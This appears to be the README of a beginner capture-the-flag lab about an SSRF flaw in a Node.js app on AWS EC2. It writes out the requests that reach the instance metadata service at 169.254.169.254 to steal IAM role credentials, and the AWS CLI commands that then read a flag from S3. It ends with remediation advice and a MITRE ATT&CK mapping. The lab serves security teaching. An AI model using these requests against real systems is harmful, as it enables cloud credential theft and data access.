# EC2 SSRF

**Difficulty:** Beginner | **Provider:** AWS | **Category:** SSRF / IMDS

## Scenario

A Node.js recipe application running on an EC2 instance exposes a `/recipe?url=` endpoint
that fetches any URL supplied by the user. The EC2 instance has an IAM role attached that
grants read access to a private S3 bucket containing the flag.

Abuse the SSRF vulnerability to reach the EC2 Instance Metadata Service (IMDS) and
exfiltrate the IAM role's temporary credentials, then use them to read the flag from S3.

## Attack Path

```
[Attacker] --> GET /recipe?url=http://169.254.169.254/...
                        |
                        v
              EC2 Instance Metadata Service
                        |
                        v
              Temporary IAM Credentials
                        |
                        v
              aws s3 cp s3://<bucket>/secret_ingredient.txt -
```

### Step 1 — Discover the IAM role name

```
GET /recipe?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

### Step 2 — Retrieve temporary credentials

```
GET /recipe?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

Extract `AccessKeyId`, `SecretAccessKey`, and `Token`.

### Step 3 — Read the flag from S3

```bash
AWS_ACCESS_KEY_ID=<id> AWS_SECRET_ACCESS_KEY=<secret> AWS_SESSION_TOKEN=<token> \
  aws s3 ls   # enumerate buckets
  aws s3 cp s3://<bucket>/secret_ingredient.txt -
```

## How to Fix in Production

1. **Enforce IMDSv2**: Set `HttpTokens = required` on the instance so IMDS requires a
   PUT pre-flight — SSRF via GET cannot obtain the session token header.
2. **Least-privilege IAM role**: Scope the instance profile to only the specific S3
   object it needs, not the entire bucket.
3. **Input validation**: Reject or block requests to RFC-1918 and link-local ranges
   (`169.254.0.0/16`, `10.0.0.0/8`, etc.) in the URL fetching logic.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Exploit Public-Facing Application | T1190 |
| Cloud Instance Metadata API | T1552.005 |
| Valid Accounts: Cloud Accounts | T1078.004 |
| Data from Cloud Storage | T1530 |
